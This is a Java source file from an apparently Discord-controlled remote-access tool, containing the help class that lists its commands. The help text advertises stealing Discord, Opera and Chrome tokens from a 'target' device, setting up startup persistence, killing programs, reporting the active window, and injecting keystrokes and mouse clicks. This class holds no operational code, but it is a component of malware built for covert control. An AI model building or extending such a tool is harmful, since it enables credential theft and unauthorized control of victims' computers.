package InvisibleCat.tabber.command.commands;

import InvisibleCat.tabber.command.Command;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;

import java.util.ArrayList;


public class Help implements Command {

    private String help = "" +
            "***Commands***\n" +
            "**Help**: Displays this message\n" +
            "**Token**: Attempts to get token for Discord, Opera, and Chrome. Example [!token]\n" +
            "**Tab**: Alt-Tabs the target on command. Example [!tab]\n" +
            "**Stop**: Kills program on target's device. Example [!stop]\n" +
            "**AutoRun**: Attempts to setup a run on startup *NOTE: this needs administrator privileges for this to work!!.* Example [!autorun]\n" +
            "**Auto**: Allows you to turn on and off auto mode. Example [!auto (on/off)]\n" +
            "**Window**: Returns the window that the host is currently looking at. Example [!window]\n" +
            "**Sendkey**: Sends any *1* key of your choice the the host computer. Example [!sendkey (key) (times pressed *op*) (delay *op*)]\n" +
            "**Admin**: Tells you if the program is admin or not. Example [!admin]\n" +
            "**Mouse**: Moves mouse to specific coordinates. Example [!mouse (x) (y)]\n" +
            "**Click**: Built in autoclicker lol. Example [!click (l/r) (# of clicks *op*) (delay *op*)]\n" +
            "**Notification**: Sends a tray notification to target computer. Example [!notification (Title) (Text)] or [!notify]\n" +
            "****" +
            "Note: *op* means it is optional and will function without it";

    public Help() {

    }



    @Override
    public String extraMessage() {
        return null;
    }

    @Override
    public String displayMessage() {
        return help;
    }
    @Override
    public void run(ArrayList<String> args, Member author, Message message) {
    }
}
